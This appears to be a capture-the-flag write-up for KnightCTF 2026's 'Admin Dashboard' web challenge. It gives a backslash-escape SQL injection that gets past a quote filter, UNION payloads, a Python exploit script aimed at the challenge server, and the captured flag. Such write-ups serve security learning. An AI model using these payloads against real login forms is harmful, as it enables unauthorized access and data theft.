---
draft: true
tags:
  - web
  - sql_injection
Date: 20-01-2026
---

# Admin Dashboard SQL Injection
KnightCTF 2026

## Challenge Overview
- **Challenge Name:** Admin Dashboard
- **Category:** Web
- **URL:** `http://50.116.19.213:3000/`

## Initial Reconnaissance

The challenge presents a simple login page labeled "Admin Dashboard".

### Key Observations
1. **Server Header:** `Server: Werkzeug/3.1.5 Python/3.12.5` indicating a Flask backend.
2. **Behavior:**
   - Valid credentials (`admin`/`pass`) redirect to dashboard.
   - Invalid credentials return "No user".
   - Common SQLi payloads (e.g., `admin' OR 1=1`) return "Not injectable" with a 400 Bad Request.

## Vulnerability Analysis

The application employs a WAF/Filter that blocks specific characters associated with SQL injection, most notably the single quote (`'`). 

However, fuzzing revealed that the backslash (`\`) character is **not** filtered.

### The Logic Flaw
In MySQL, a backslash escapes the next character. If we input `admin\` as the username, the query structure changes unexpectedly:

Original Query (Hypothetical):
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

With `username=admin\` and `password= OR 1=1--`:
```sql
SELECT * FROM users WHERE username='admin\' AND password=' OR 1=1-- '
```

The backslash escapes the single quote that should close the username string. This causes the SQL parser to treat the first part of the query as:
`username='admin\' AND password='`

This effectively "swallows" the password field check and allows us to inject our own SQL logic in the password parameter.

## Exploitation

### 1. Confirming the Injection
Using the payload:
- Username: `admin\`
- Password: ` OR 1=1-- `

Result: Successful login as `admin`.

### 2. Identifying the Database
We used UNION injection to extract data. The application reflects the username in the `Set-Cookie` header and the dashboard ("Hello, {username}"), which allows us to view the output of our injection.

Payload: `UNION SELECT database(),2-- `
Result: `chall`

### 3. Enumeration
Attempts to query `information_schema` were partially blocked or filtered, returning `"Uhuuu etooo boro!!"`. However, guessed table names worked.

- **Users Table:** `users` (columns: username, password) -> `admin:pass`, `hacker:1337`
- **Flag Table:** Enumeration revealed a table named `flag`.

### 4. Extracting the Flag
We attempted to guess the column name in the `flag` table.
- `flag` (column) -> Error
- `id` -> Error
- `value` -> **Success!**

## Exploit Script

```python
import requests

url = "http://50.116.19.213:3000/login"

def inject(payload):
    """Perform SQL injection with the backslash escape technique"""
    data = {
        'username': 'admin\\',
        'password': f' {payload}-- '
    }
    # We disable redirects to check the Set-Cookie header
    response = requests.post(url, data=data, allow_redirects=False)
    
    cookies = response.cookies.get_dict()
    if 'username' in cookies:
        return cookies['username']
    return None

print("[*] Exploiting Admin Dashboard...")

# step 1: Confirm Injection
print(f"[*] Database: {inject('UNION SELECT database(),2')}")

# step 2: Extract Flag
# We discovered the table 'flag' and column 'value' through enumeration
flag = inject("UNION SELECT value,2 FROM flag")
print(f"[*] Flag: {flag}")
```

## Result

Running the exploit script yields:

```
[*] Exploiting Admin Dashboard...
[*] Database: chall
[*] Flag: KCTF{0c259a70a089442a7e622d02bb5d911f}
```

## Flag
```
KCTF{0c259a70a089442a7e622d02bb5d911f}
```

## Key Takeaways
1. **Sanitization Gaps:** Blocking quotes (`'`) is insufficient if escape characters (`\`) are allowed.
2. **Backslash Injection:** A powerful technique to break out of SQL strings when quotes are filtered but backslashes aren't.
3. **UNION-Based Extraction:** Reflected inputs (like cookies or welcome messages) are excellent vectors for data exfiltration.
